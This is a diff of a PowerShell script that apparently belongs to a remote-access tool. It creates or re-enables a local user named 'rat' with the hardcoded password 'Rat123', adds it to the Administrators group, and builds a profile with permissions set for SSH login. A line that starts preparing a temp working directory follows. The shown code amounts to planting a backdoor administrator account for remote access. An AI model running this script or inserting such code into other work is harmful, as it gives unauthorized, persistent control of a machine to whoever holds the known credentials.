@@ -10,22 +10,48 @@ function Create-NewLocalAdmin {
         [string] $NewLocalAdmin,
         [securestring] $Password
     )
-    begin {
-    }
-    process {
-        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
-        Write-Verbose "$NewLocalAdmin local user crated"
-        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
-        Write-Verbose "$NewLocalAdmin added to the local administrator group"
 
-    }
-    end {
+    process {
+        #  Create local user if it doesn't exist
+        if (-not (Get-LocalUser -Name $NewLocalAdmin -ErrorAction SilentlyContinue)) {
+            New-LocalUser -Name $NewLocalAdmin -Password $Password -FullName $NewLocalAdmin -Description "Temporary local admin"
+            Write-Verbose "$NewLocalAdmin local user created"
+        } else {
+            Write-Verbose "$NewLocalAdmin already exists"
+            Enable-LocalUser -Name $NewLocalAdmin
+        }
+
+        #  Add to Administrators group if not already
+        if (-not (Get-LocalGroupMember -Group "Administrators" | Where-Object {$_.Name -eq $NewLocalAdmin})) {
+            Add-LocalGroupMember -Group "Administrators" -Member $NewLocalAdmin
+            Write-Verbose "$NewLocalAdmin added to Administrators group"
+        } else {
+            Write-Verbose "$NewLocalAdmin is already an administrator"
+        }
+
+        #  Initialize profile folder for SSH login
+        $ProfilePath = "C:\Users\$NewLocalAdmin"
+        if (-not (Test-Path $ProfilePath)) {
+            # Copy default profile skeleton
+            Copy-Item "C:\Users\Default" $ProfilePath -Recurse -Force
+            Copy-Item "C:\Users\Default\NTUSER.DAT" "$ProfilePath\NTUSER.DAT" -Force
+
+            # Fix ownership and permissions so SSH can access
+            icacls $ProfilePath /setowner ${NewLocalAdmin} /T /C
+            icacls $ProfilePath /grant ${NewLocalAdmin}:(OI)(CI)F /T /C
+
+            Write-Verbose "Profile for $NewLocalAdmin initialized"
+        } else {
+            Write-Verbose "Profile for $NewLocalAdmin already exists"
+        }
     }
 }
-#create admin user
+
+# Example usage
 $NewLocalAdmin = "rat"
-$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
+$Password = ConvertTo-SecureString "Rat123" -AsPlainText -Force
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
+
 
 #goto temp and make working directory
 $wd = random_text
